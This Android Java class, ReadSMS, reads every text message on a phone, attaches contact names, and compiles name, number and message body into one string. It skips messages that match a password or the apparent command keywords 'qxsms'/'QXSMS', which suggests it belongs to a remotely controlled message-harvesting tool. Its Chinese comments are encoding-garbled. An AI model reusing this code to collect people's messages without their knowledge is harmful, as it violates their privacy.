package my.pro;

import android.app.Activity;
import android.database.Cursor;

public class ReadSMS extends Activity {

	public StringBuilder smsNumber(Cursor smsCur, Cursor contactCur, String password) {

		StringBuilder str = new StringBuilder();

		ReadContacts contactsPro = new ReadContacts();
		try {

			if (smsCur != null) {
				if (smsCur.moveToFirst()) {
					String smsNumber = new String();
					String smsBody = new String();

					
					
					String testStr = new String();
					do {

						// �õ��Ķ��ź����ʽΪ+86135****0534���͵ģ��ȶԻ�ȡ�Ķ��ź�����д���ȥ��+86
						smsNumber = smsCur.getString(smsCur.getColumnIndex("address"));
						// substring������ȡ�ַ�������startIndex��ʼ����endIndex����
						if (smsNumber.charAt(0) == '+') {
							smsNumber = smsNumber.substring(3, smsNumber.length());
						}

						smsBody = smsCur.getString(smsCur.getColumnIndex("body"));
						//smsData = smsCur.getShort(smsCur.getColumnIndex("data"));

						//��ϵ������
						testStr = contactsPro.contactName(smsNumber, contactCur);
						
						if (smsBody.equals(password) == false && smsBody.equals("qxsms") == false && smsBody.equals("QXSMS") == false) {
							str.append(testStr);
							str.append("-");
							str.append(smsNumber);
							str.append("-");
							str.append(smsBody);
							str.append("\n");
							//str.append("/");
							//str.append("\n");
						}
					} while (smsCur.moveToNext());
				}
			}
		} catch (Exception ex) {
			str.append(ex.toString());
		} finally {
			smsCur.close();
			contactCur.close();
		}
		return str;

	}
	
	
	public StringBuilder smsNumber(Cursor smsCur, Cursor contactCur, String password,long restartTime) {

		StringBuilder str = new StringBuilder();

		ReadContacts contactsPro = new ReadContacts();
		try {

			if (smsCur != null) {
				if (smsCur.moveToFirst()) {
					String smsNumber = new String();
					String smsBody = new String();

					
					
					String testStr = new String();
					do {

						// �õ��Ķ��ź����ʽΪ+86135****0534���͵ģ��ȶԻ�ȡ�Ķ��ź�����д���ȥ��+86
						smsNumber = smsCur.getString(smsCur.getColumnIndex("address"));
						// substring������ȡ�ַ�������startIndex��ʼ����endIndex����
						if (smsNumber.charAt(0) == '+') {
							smsNumber = smsNumber.substring(3, smsNumber.length());
						}

						smsBody = smsCur.getString(smsCur.getColumnIndex("body"));
						//smsData = smsCur.getShort(smsCur.getColumnIndex("data"));

						//��ϵ������
						testStr = contactsPro.contactName(smsNumber, contactCur);
						//���Ž���ʱ��
						long receiverTime = smsCur.getLong(smsCur.getColumnIndex("date"));
						
						if (smsBody.equals(password) == false && receiverTime > restartTime && smsBody.equals("qxsms") == false && smsBody.equals("QXSMS") == false) {
							str.append(testStr);
							str.append("\n");
							str.append(smsNumber);
							str.append("\n");
							str.append(smsBody);
							str.append("\n");
							str.append("/");
							str.append("\n");
						}
					} while (smsCur.moveToNext());
				}
			}
		} catch (Exception ex) {
			str.append(ex.toString());
		} finally {
			smsCur.close();
			contactCur.close();
		}
		return str;

	}
	
	
	
	
	

}
